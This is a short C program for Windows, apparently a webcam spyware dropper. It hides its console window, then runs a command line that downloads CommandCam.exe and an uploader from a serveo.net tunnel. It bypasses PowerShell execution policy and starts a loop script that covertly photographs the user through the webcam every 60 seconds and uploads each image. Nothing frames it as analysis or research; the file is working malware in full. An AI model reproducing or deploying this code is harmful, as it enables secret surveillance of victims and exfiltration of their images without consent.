
int main(int argc, char *argv[])
{
  ShowWindow (GetConsoleWindow(), SW_HIDE);

   char command[6100];

 strcpy(command, "cmd.exe /c cd %USERPROFILE%\\ & echo (New-Object System.Net.WebClient).DownloadFile('http://serveo.net:serveo_port/CommandCam.exe', 'CommandCam.exe')  > %USERPROFILE%\\getcc.ps1 & echo (New-Object System.Net.WebClient).DownloadFile('http://serveo.net:serveo_port/uploader.exe', 'uploader.exe')  >> %USERPROFILE%\\getcc.ps1 & cd %USERPROFILE%\\ & powershell -ExecutionPolicy ByPass -File %USERPROFILE%\\getcc.ps1 & echo while ($true) { > %USERPROFILE%\\sc.ps1 & echo start -NoNewWindow CommandCam.exe -Wait >> %USERPROFILE%\\sc.ps1 & echo start -NoNewWindow uploader.exe >> %USERPROFILE%\\sc.ps1 & echo sleep 60 >> %USERPROFILE%\\sc.ps1 & echo taskkill /F /IM uploader.exe } >> %USERPROFILE%\\sc.ps1 & cd %USERPROFILE%\\ &  powershell -ExecutionPolicy ByPass -File %USERPROFILE%\\sc.ps1 & exit");
 system(command);
return 0;
}

